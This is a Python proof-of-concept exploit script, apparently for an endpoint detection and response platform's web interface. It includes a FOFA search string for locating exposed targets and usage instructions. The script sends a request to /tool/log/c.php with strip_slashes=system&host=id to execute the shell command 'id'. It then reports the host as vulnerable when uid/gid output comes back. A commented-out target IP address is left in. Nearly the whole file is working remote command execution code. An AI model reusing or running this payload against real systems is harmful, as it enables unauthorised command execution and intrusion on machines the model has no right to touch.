#!/bin/bash/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
def title():
    print('fofa:title="终端检测响应平台"')
    print('使用教程：python poc.py 1.1.1.1:80')
def run_https(ip, port):
    requests.packages.urllib3.disable_warnings()
    print("https")
    url = "https://{}:{}/tool/log/c.php?strip_slashes=system&host=id".format(ip, port)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        req = requests.get(url=url, headers=headers, verify=False, timeout=3)
        if req.status_code == 200 and 'uid=' in req.text and 'gid=' in req.text and 'groups=' in req.text:
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    url = "http://{}:{}/tool/log/c.php?strip_slashes=system&host=id".format(ip, port)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        req = requests.get(url=url, headers=headers, timeout=3)
        if req.status_code == 200 and 'uid=' in req.text and 'gid=' in req.text and 'groups=' in req.text:
            return True
        else:
            return run_https(ip, port)
    except Exception as e:
        return run_https(ip, port)

if __name__ == '__main__':
    target = sys.argv[1]
    #target = '121.46.30.170:443'
    ip = target.split(':')[0]
    port = int(target.split(':')[1])

    result = run(ip, port)
    if result:
        print("Exist")
    else:
        print("UnExist")
